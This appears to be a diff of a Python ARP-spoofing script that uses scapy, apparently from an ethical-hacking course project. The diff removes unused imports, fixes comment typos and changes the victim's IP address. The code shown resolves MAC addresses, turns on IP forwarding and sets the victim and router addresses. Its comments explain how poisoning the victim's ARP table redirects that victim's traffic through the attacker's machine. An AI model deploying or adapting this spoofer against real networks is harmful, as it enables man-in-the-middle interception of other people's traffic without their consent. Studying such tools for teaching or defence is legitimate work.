@@ -1,19 +1,17 @@
 #!/usr/bin/env python
 
-import sys
 import time
 import scapy.all as scapy
 import subprocess
-from sshuttle.helpers import verbose
 
 def get_mac(ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")            # Ethernet frame
     arp_request = scapy.ARP(pdst=ip)                            # ARP packet
-    arp_request_broadcast = broadcast/arp_request               # put ARP packet inside Ethernet-frame ## '/' is appending
+    arp_request_broadcast = broadcast/arp_request               # put ARP packet inside Ethernet frame ## '/' is appending
     answered, unanswered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)   # send and receive
     return answered[0][1].hwsrc
 
-# op=2  ==> creating an ARP response ==> meaning: redirect the flow of packets trough ower computer (1: request, 2: response)
+# op=2  ==> creating an ARP response ==> meaning: redirect the flow of packets through ower computer (1: request, 2: response)
 # pdst  ==> <target IP>
 # hwdst ==> <target MAC>
 # psrc  ==> <router IP>
@@ -32,10 +30,10 @@ def restore(destination_ip, source_ip):
 # IP Forwarding
 subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
 
-# we're telling the victim  that we are the router,
+# we're telling the victim that we are the router,
 # and otherwise we're telling the router that we are the victim
-# it wil  update the ARP table of the target
-target_ip = "192.168.0.135"
+# it will update the ARP table of the target
+target_ip = "192.168.0.226"
 router_ip = "192.168.0.1"
 packet_count = 0
 try:
